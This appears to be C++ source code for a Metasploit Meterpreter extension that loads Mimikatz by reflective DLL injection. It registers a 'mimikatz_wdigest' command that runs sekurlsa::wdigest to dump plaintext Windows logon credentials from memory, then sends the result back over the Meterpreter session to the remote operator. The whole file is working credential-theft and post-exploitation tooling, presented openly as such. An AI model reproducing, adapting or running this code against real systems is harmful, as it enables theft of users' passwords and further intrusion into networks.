#include "main.h"

#include <iostream>
#include <fstream>
extern "C" 
{
/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : http://creativecommons.org/licenses/by-nc-sa/3.0/fr/
*/

#include "../../ReflectiveDLLInjection/DelayLoadMetSrv.h"
// include the Reflectiveloader() function, we end up linking back to the metsrv.dll's Init function
// but this doesnt matter as we wont ever call DLL_METASPLOIT_ATTACH as that is only used by the 
// second stage reflective dll inject payload and not the metsrv itself when it loads extensions.
#include "../../ReflectiveDLLInjection/ReflectiveLoader.c"

// this sets the delay load hook function, see DelayLoadMetSrv.h
EnableDelayLoadMetSrv();

mimikatz * myMimiKatz;

void initialize_mimikatz()
{
	vector<wstring> *args;
	if (!myMimiKatz)
	{
		args = new vector<wstring>();
		myMimiKatz = new mimikatz(args);
		delete args;
	}
}

DWORD request_boiler(Remote *remote, Packet *packet)
{
	Packet * response = packet_create_response(packet);
	bool iResult = 0;

	wstring function = (L"sekurlsa::wdigest");
	vector<wstring> *args = new vector<wstring>();

	initialize_mimikatz();
	myMimiKatz->doCommandeLocale(&function, args);
	//delete myMimiKatz, args;

	//http://clymb3r.wordpress.com/2013/04/09/modifying-mimikatz-to-be-loaded-using-invoke-reflectivedllinjection-ps1/
	wstring output = oss.str(); 
	const wchar_t* outputStr = output.c_str(); 
	wchar_t* out = new wchar_t[output.size()+1]; 
	wcscpy(out, outputStr); 
	out[output.size()] = '\0';
	
	packet_add_tlv_raw(response, TLV_MIMIKATZ_RESULT, out, wcslen(out)*sizeof(wchar_t));
	packet_transmit_response(iResult, remote, response);

	return ERROR_SUCCESS;	
}

Command customCommands[] =
{
	{ "mimikatz_wdigest",
	  { request_boiler,                                    { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                      },
	},

	// Terminator
	{ NULL,
	  { EMPTY_DISPATCH_HANDLER                      },
	  { EMPTY_DISPATCH_HANDLER                      },
	},
};

/*
 * Initialize the server extension
 */
DWORD __declspec(dllexport) InitServerExtension(Remote *remote)
{
	DWORD index;

	hMetSrv = remote->hMetSrv;

	for (index = 0;
	     customCommands[index].method;
	     index++)
		command_register(&customCommands[index]);

	return ERROR_SUCCESS;
}

/*
 * Deinitialize the server extension
 */
DWORD __declspec(dllexport) DeinitServerExtension(Remote *remote)
{
	DWORD index;

	for (index = 0;
	     customCommands[index].method;
	     index++)
		command_deregister(&customCommands[index]);

	return ERROR_SUCCESS;
}
}
